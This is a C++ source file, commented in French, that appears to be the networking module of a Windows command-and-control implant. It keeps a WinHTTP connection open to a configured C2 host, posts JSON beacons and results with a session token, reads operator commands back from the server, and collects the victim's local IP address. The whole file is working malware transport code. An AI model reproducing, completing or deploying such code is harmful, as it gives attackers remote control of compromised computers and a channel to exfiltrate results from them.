#include "network.h"
#include "config.h"
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <string>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")

namespace {

// --- Connexion WinHTTP ----------------------------------------------------
// La connexion HTTP est conservee d'un appel a l'autre : WinHTTP reutilise
// alors la meme socket TCP (keep-alive), au lieu de rouvrir une connexion a
// chaque cycle.

struct HttpConnection {
	HINTERNET session = nullptr;
	HINTERNET server = nullptr;
};

HttpConnection& shared_connection() {
	static HttpConnection http;
	return http;
}

void close_connection(HttpConnection& http) {
	if (http.server) WinHttpCloseHandle(http.server);
	if (http.session) WinHttpCloseHandle(http.session);
	http = HttpConnection{};
}

bool open_connection(HttpConnection& http, unsigned long& error) {
	http.session = WinHttpOpen(UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY,
		WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (!http.session) {
		error = GetLastError();
		return false;
	}

	WinHttpSetTimeouts(http.session,
		TimeoutResolveMs, TimeoutConnectMs, TimeoutSendMs, TimeoutReceiveMs);

	http.server = WinHttpConnect(http.session, C2_HOST, C2_PORT, 0);
	if (!http.server) {
		error = GetLastError();
		close_connection(http);
		return false;
	}
	return true;
}

// En-tetes de la requete : toujours le type de contenu, plus le jeton de
// session quand on en possede un (routes /beacon et /result).
std::wstring request_headers(const std::string& session_token) {
	std::wstring headers = L"Content-Type: application/json\r\n";
	if (!session_token.empty()) {
		headers += L"X-Session-Token: ";
		headers.append(session_token.begin(), session_token.end());
		headers += L"\r\n";
	}
	return headers;
}

}  // namespace

HttpReply post_json(const std::wstring& path,
                    const std::string& body,
                    const std::string& session_token) {
	HttpReply reply;
	HttpConnection& http = shared_connection();

	if (!http.session || !http.server) {
		close_connection(http);
		if (!open_connection(http, reply.error)) {
			reply.result = SendResult::NetworkError;
			return reply;
		}
	}

	HINTERNET request = WinHttpOpenRequest(http.server, L"POST", path.c_str(),
		nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (!request) {
		reply.result = SendResult::NetworkError;
		reply.error = GetLastError();
		return reply;
	}

	const std::wstring headers = request_headers(session_token);

	BOOL sent = WinHttpSendRequest(request, headers.c_str(), static_cast<DWORD>(-1),
		(LPVOID)body.c_str(), static_cast<DWORD>(body.size()),
		static_cast<DWORD>(body.size()), 0);

	// WinHttpReceiveResponse bloque jusqu'a l'arrivee des en-tetes : c'est ici,
	// et pas dans une boucle de sleep, que s'ecoule la tenue cote serveur.
	if (!sent || !WinHttpReceiveResponse(request, nullptr)) {
		reply.result = SendResult::NetworkError;
		reply.error = GetLastError();
		WinHttpCloseHandle(request);
		close_connection(http);   // la socket est probablement morte
		return reply;
	}

	DWORD status = 0;
	DWORD status_size = sizeof(status);
	if (!WinHttpQueryHeaders(request,
		WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &status, &status_size, WINHTTP_NO_HEADER_INDEX)) {
		reply.result = SendResult::NetworkError;
		reply.error = GetLastError();
		WinHttpCloseHandle(request);
		return reply;
	}

	std::string response_body;
	bool read_ok = true;
	bool connection_ok = true;
	for (;;) {
		DWORD available = 0;
		if (!WinHttpQueryDataAvailable(request, &available)) {
			reply.result = SendResult::NetworkError;
			reply.error = GetLastError();
			read_ok = false;
			connection_ok = false;
			break;
		}
		if (available == 0) break;

		// Une commande tient en une ligne : une reponse plus grosse que la
		// limite est anormale, on refuse plutot que de charger en memoire.
		if (response_body.size() + available > MaxResponseBytes) {
			reply.result = SendResult::NetworkError;
			reply.error = ERROR_BUFFER_OVERFLOW;
			read_ok = false;
			connection_ok = false;
			break;
		}

		// &chunk[0] plutot que chunk.data() : data() ne renvoie un char*
		// qu'en C++17, alors que le projet se compile aussi en C++14.
		std::string chunk(available, '\0');
		DWORD read = 0;
		if (!WinHttpReadData(request, &chunk[0], available, &read)) {
			reply.result = SendResult::NetworkError;
			reply.error = GetLastError();
			read_ok = false;
			connection_ok = false;
			break;
		}
		response_body.append(chunk.data(), read);
	}

	WinHttpCloseHandle(request);

	if (!connection_ok) {
		close_connection(http);   // flux desynchronise : on repart propre
	}

	if (read_ok) {
		reply.result = SendResult::Ok;
		reply.status = static_cast<int>(status);
		reply.body = response_body;
	}
	return reply;
}

std::string local_ipv4() {
	ULONG size = sizeof(IP_ADAPTER_INFO);
	PIP_ADAPTER_INFO info = static_cast<PIP_ADAPTER_INFO>(malloc(size));
	if (!info) {
		return "0.0.0.0";
	}

	if (GetAdaptersInfo(info, &size) == ERROR_BUFFER_OVERFLOW) {
		PIP_ADAPTER_INFO resized = static_cast<PIP_ADAPTER_INFO>(realloc(info, size));
		if (!resized) {
			free(info);
			return "0.0.0.0";
		}
		info = resized;
	}

	std::string result = "0.0.0.0";
	if (GetAdaptersInfo(info, &size) == NO_ERROR) {
		for (PIP_ADAPTER_INFO adapter = info; adapter != nullptr && result == "0.0.0.0";
			adapter = adapter->Next) {
			for (PIP_ADDR_STRING ip = &adapter->IpAddressList; ip != nullptr; ip = ip->Next) {
				const std::string address = ip->IpAddress.String;
				if (address.empty() || address == "0.0.0.0" ||
					address.rfind("127.", 0) == 0) {
					continue;
				}
				result = address;
				break;
			}
		}
	}

	free(info);
	return result;
}
